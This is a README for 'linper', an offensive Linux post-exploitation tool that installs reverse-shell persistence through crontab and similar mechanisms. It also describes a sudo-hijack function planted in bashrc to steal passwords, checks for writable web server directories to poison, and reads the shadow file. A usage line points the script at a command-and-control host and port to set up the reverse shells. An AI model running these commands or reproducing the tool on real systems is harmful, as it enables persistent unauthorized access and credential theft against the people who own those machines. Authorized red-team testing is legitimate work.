# linper

Automated Linux Persistence Establishment

Automatically install multiple methods of persistence, or just enumerate possible methods.

## files

- README.md - or not
- TODO.md - planned fixes & enhancements
- linper.sh - execute on target
- gtfobins/ - directory containing (possibly modified) snippets of code from [gtfobins](https://gtfobins.github.io/) as I am working on integrating them into the overall script

## usage

Enumerate all persistence methods and install

`bash linper.sh --rhost myc2.host.domain --rport 4444`

Enumerate and do not install

`bash linper.sh -d`

## methodology

1. Enumerating methods and doors - the script enumerates binaries that can be used for executing a reverse shell (methods, e.g. bash), and then for each of those, it enumerates ways to make them persist (doors, e.g. crontab). If dryrun is not set, every possible method and door pair is set
2. Sudo hijack attack - Enumerates whether or not the current user can sudo, if so, and if dryrun not set, it installs a function in their bashrc to "hijack that binary". Thanks to [this Null Byte article](https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/) for the idea.
3. Web Server Poison Attack - Enumerates whether or not the webserver's directories are writable (this feature will be expanded, see TODO.md)
4. Shadow file enumeration - Enumerates whether or not the shadow file is readable, if dryrun is not set then it will grep for non-system accounts
